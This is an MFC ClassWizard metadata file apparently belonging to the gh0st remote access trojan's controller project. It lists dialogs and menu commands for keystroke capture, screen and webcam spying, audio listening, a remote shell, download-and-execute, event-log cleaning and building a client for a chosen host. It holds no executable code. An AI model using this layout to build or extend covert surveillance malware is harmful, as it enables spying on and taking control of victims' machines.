; CLW file contains information for the MFC ClassWizard

[General Info]
Version=1
LastClass=CBuildServer
LastTemplate=CDialog
NewFileInclude1=#include "stdafx.h"
NewFileInclude2=#include "gh0st.h"
LastPage=0

ClassCount=16
Class1=CAudioDlg
Class2=CFileManagerDlg
Class3=CFileTransferModeDlg
Class4=CGh0stApp
Class5=CAboutDlg
Class6=CGh0stDoc
Class7=CGh0stView
Class8=CKeyBoardDlg
Class9=CMainFrame
Class10=CScreenSpyDlg
Class11=CShellDlg
Class12=CSystemDlg
Class13=CTrueColorToolBar
Class14=CWebCamDlg

ResourceCount=21
Resource1=IDR_LIST
Resource2=IDD_AUDIO
Resource3=IDD_BUILD_SERVER
Resource4=IDR_REMOTE_VIEW
Resource5=IDD_SHELL
Resource6=IDD_ABOUTBOX
Resource7=IDR_MINIMIZE
Resource8=IDD_SETTINGS
Resource9=IDR_TOOLBAR1
Resource10=IDD_KEYBOARD
Resource11=IDD_FILE
Resource12=IDR_LOCAL_VIEW
Resource13=IDR_TOOLBAR2
Resource14=IDR_PSLIST
Resource15=IDR_FILEMANAGER
Resource16=IDR_MAINFRAME
Resource17=IDD_WEBCAM
Resource18=IDD_SCREENSPY
Class15=CBuildServer
Resource19=IDD_TRANSFERMODE_DLG
Class16=CSettings
Resource20=IDD_SYSTEM
Resource21=IDR_TOOLBAR_MAIN

[CLS:CAudioDlg]
Type=0
BaseClass=CDialog
HeaderFile=AudioDlg.h
ImplementationFile=AudioDlg.cpp

[CLS:CFileManagerDlg]
Type=0
BaseClass=CDialog
HeaderFile=FileManagerDlg.h
ImplementationFile=FileManagerDlg.cpp

[CLS:CFileTransferModeDlg]
Type=0
BaseClass=CDialog
HeaderFile=FileTransferModeDlg.h
ImplementationFile=FileTransferModeDlg.cpp

[CLS:CGh0stApp]
Type=0
BaseClass=CWinApp
HeaderFile=gh0st.h
ImplementationFile=gh0st.cpp

[CLS:CAboutDlg]
Type=0
BaseClass=CDialog
HeaderFile=gh0st.cpp
ImplementationFile=gh0st.cpp
LastObject=IDM_SETTING

[CLS:CGh0stDoc]
Type=0
BaseClass=CDocument
HeaderFile=gh0stDoc.h
ImplementationFile=gh0stDoc.cpp

[CLS:CGh0stView]
Type=0
BaseClass=CListView
HeaderFile=gh0stView.h
ImplementationFile=gh0stView.cpp

[CLS:CKeyBoardDlg]
Type=0
BaseClass=CDialog
HeaderFile=KeyBoardDlg.h
ImplementationFile=KeyBoardDlg.cpp

[CLS:CMainFrame]
Type=0
BaseClass=CFrameWnd
HeaderFile=MainFrm.h
ImplementationFile=MainFrm.cpp
Filter=T
VirtualFilter=fWC
LastObject=CMainFrame

[CLS:CScreenSpyDlg]
Type=0
BaseClass=CDialog
HeaderFile=ScreenSpyDlg.h
ImplementationFile=ScreenSpyDlg.cpp

[CLS:CShellDlg]
Type=0
BaseClass=CDialog
HeaderFile=ShellDlg.h
ImplementationFile=ShellDlg.cpp

[CLS:CSystemDlg]
Type=0
BaseClass=CDialog
HeaderFile=SystemDlg.h
ImplementationFile=SystemDlg.cpp

[CLS:CTrueColorToolBar]
Type=0
BaseClass=CToolBar
HeaderFile=TrueColorToolBar.h
ImplementationFile=TrueColorToolBar.cpp

[CLS:CWebCamDlg]
Type=0
BaseClass=CDialog
HeaderFile=WebCamDlg.h
ImplementationFile=WebCamDlg.cpp

[DLG:IDD_AUDIO]
Type=1
Class=CAudioDlg
ControlCount=5
Control1=IDC_STATIC,button,1342177287
Control2=IDC_SEND_LOCALAUDIO,button,1342177283
Control3=IDC_STATIC,static,1342308352
Control4=IDC_STATIC,static,1342308352
Control5=IDC_TIPS,static,1342308352

[DLG:IDD_FILE]
Type=1
Class=CFileManagerDlg
ControlCount=6
Control1=IDC_LOCAL_PATH,combobox,1344340290
Control2=IDC_LIST_LOCAL,SysListView32,1350632192
Control3=IDC_REMOTE_PATH,combobox,1344340290
Control4=IDC_LIST_REMOTE,SysListView32,1350632200
Control5=IDC_STATIC,static,1342308352
Control6=IDC_STATIC_REMOTE,static,1342308352

[DLG:IDD_TRANSFERMODE_DLG]
Type=1
Class=CFileTransferModeDlg
ControlCount=9
Control1=IDC_STATIC,button,1342177287
Control2=IDC_TIPS,static,1342308352
Control3=IDC_OVERWRITE,button,1342242816
Control4=IDC_ADDITION,button,1342242816
Control5=IDC_JUMP,button,1342242816
Control6=IDC_OVERWRITE_ALL,button,1342242816
Control7=IDC_ADDITION_ALL,button,1342242816
Control8=IDC_JUMP_ALL,button,1342242816
Control9=IDC_CANCEL,button,1342242816

[DLG:IDD_ABOUTBOX]
Type=1
Class=CAboutDlg
ControlCount=4
Control1=IDC_STATIC,static,1342177283
Control2=IDC_STATIC,static,1342308480
Control3=IDC_STATIC,static,1342308352
Control4=IDOK,button,1342373889

[DLG:IDD_KEYBOARD]
Type=1
Class=CKeyBoardDlg
ControlCount=1
Control1=IDC_EDIT,edit,1352734788

[DLG:IDD_SCREENSPY]
Type=1
Class=CScreenSpyDlg
ControlCount=0

[DLG:IDD_SHELL]
Type=1
Class=CShellDlg
ControlCount=1
Control1=IDC_EDIT,edit,1353781444

[DLG:IDD_SYSTEM]
Type=1
Class=CSystemDlg
ControlCount=4
Control1=IDC_LIST_PROCESS,SysListView32,1350631425
Control2=IDC_TAB,SysTabControl32,1342177600
Control3=IDC_LIST_WINDOWS,SysListView32,1350631425
Control4=IDC_LIST_DIALUPASS,SysListView32,1350631425

[DLG:IDD_WEBCAM]
Type=1
Class=CWebCamDlg
ControlCount=0

[MNU:IDR_MAINFRAME]
Type=1
Class=?
Command1=ID_APP_PWD
Command2=IDM_SETTING
Command3=IDM_BUILD
Command4=ID_VIEW_STATUS_BAR
Command5=ID_APP_ABOUT
CommandCount=5

[MNU:IDR_LIST]
Type=1
Class=?
Command1=IDM_FILEMANAGER
Command2=IDM_SCREENSPY
Command3=IDM_KEYBOARD
Command4=IDM_REMOTESHELL
Command5=IDM_SYSTEM
Command6=IDM_WEBCAM
Command7=IDM_AUDIO_LISTEN
Command8=IDM_LOGOFF
Command9=IDM_REBOOT
Command10=IDM_SHUTDOWN
Command11=IDM_REMOVE
Command12=IDM_DOWNEXEC
Command13=IDM_UPDATE_SERVER
Command14=IDM_OPEN_URL_HIDE
Command15=IDM_OPEN_URL_SHOW
Command16=IDM_CLEANEVENT
Command17=IDM_RENAME_REMARK
Command18=IDM_DISCONNECT
Command19=IDM_SELECT_ALL
Command20=IDM_UNSELECT_ALL
CommandCount=20

[MNU:IDR_FILEMANAGER]
Type=1
Class=?
Command1=IDM_TRANSFER
Command2=IDM_RENAME
Command3=IDM_DELETE
Command4=IDM_NEWFOLDER
Command5=IDM_LOCAL_OPEN
Command6=IDM_REMOTE_OPEN_SHOW
Command7=IDM_REMOTE_OPEN_HIDE
Command8=IDM_REFRESH
CommandCount=8

[MNU:IDR_LOCAL_VIEW]
Type=1
Class=?
Command1=IDM_LOCAL_BIGICON
Command2=IDM_LOCAL_SMALLICON
Command3=IDM_LOCAL_LIST
Command4=IDM_LOCAL_REPORT
CommandCount=4

[MNU:IDR_REMOTE_VIEW]
Type=1
Class=?
Command1=IDM_REMOTE_BIGICON
Command2=IDM_REMOTE_SMALLICON
Command3=IDM_REMOTE_LIST
Command4=IDM_REMOTE_REPORT
CommandCount=4

[MNU:IDR_PSLIST]
Type=1
Class=?
Command1=IDM_KILLPROCESS
Command2=IDM_REFRESHPSLIST
CommandCount=2

[MNU:IDR_MINIMIZE]
Type=1
Class=?
Command1=IDM_SHOW
Command2=IDM_HIDE
Command3=IDM_EXIT
CommandCount=3

[DLG:IDD_BUILD_SERVER]
Type=1
Class=CBuildServer
ControlCount=8
Control1=IDC_STATIC,static,1342308352
Control2=IDC_REMOTE_PORT,edit,1350639745
Control3=IDC_TEST_MASTER,button,1342275584
Control4=IDC_BUILD,button,1342275584
Control5=IDC_STATIC,button,1342177287
Control6=IDC_EXIT,button,1342275584
Control7=IDC_REMOTE_HOST,edit,1350631553
Control8=IDC_STATIC,static,1342308352

[TB:IDR_TOOLBAR1]
Type=1
Class=?
Command1=IDT_LOCAL_PREV
Command2=IDT_LOCAL_COPY
Command3=IDT_LOCAL_DELETE
Command4=IDT_LOCAL_NEWFOLDER
Command5=IDT_LOCAL_VIEW
Command6=IDT_LOCAL_STOP
CommandCount=6

[TB:IDR_TOOLBAR2]
Type=1
Class=?
Command1=IDT_REMOTE_PREV
Command2=IDT_REMOTE_COPY
Command3=IDT_REMOTE_DELETE
Command4=IDT_REMOTE_NEWFOLDER
Command5=IDT_REMOTE_VIEW
Command6=IDT_REMOTE_STOP
CommandCount=6

[CLS:CBuildServer]
Type=0
HeaderFile=BuildServer.h
ImplementationFile=BuildServer.cpp
BaseClass=CDialog
Filter=D
LastObject=IDC_CHECK_DELETE
VirtualFilter=dWC

[DLG:IDD_SETTINGS]
Type=1
Class=CSettings
ControlCount=10
Control1=65535,button,1342177287
Control2=IDC_APPLY,button,1342242816
Control3=65535,static,1342308352
Control4=IDC_LISTEN_PORT,edit,1350639745
Control5=65535,static,1342308352
Control6=IDC_CONNECT_MAX,edit,1350639745
Control7=IDC_CONNECT_AUTO,button,1342242819
Control8=65535,button,1342177287
Control9=IDC_SYSTEM_TIPS,static,1342308352
Control10=IDC_DISABLE_POPTIPS,button,1342242819

[CLS:CSettings]
Type=0
HeaderFile=Settings.h
ImplementationFile=Settings.cpp
BaseClass=CDialog
Filter=D
LastObject=IDC_LISTEN_PORT
VirtualFilter=dWC

[TB:IDR_TOOLBAR_MAIN]
Type=1
Class=?
Command1=IDM_FILEMANAGER
Command2=IDM_SCREENSPY
Command3=IDM_WEBCAM
Command4=IDM_AUDIO_LISTEN
Command5=IDM_REMOTESHELL
Command6=IDM_BUILD
Command7=IDM_SYSTEM
Command8=IDM_EXIT
CommandCount=8

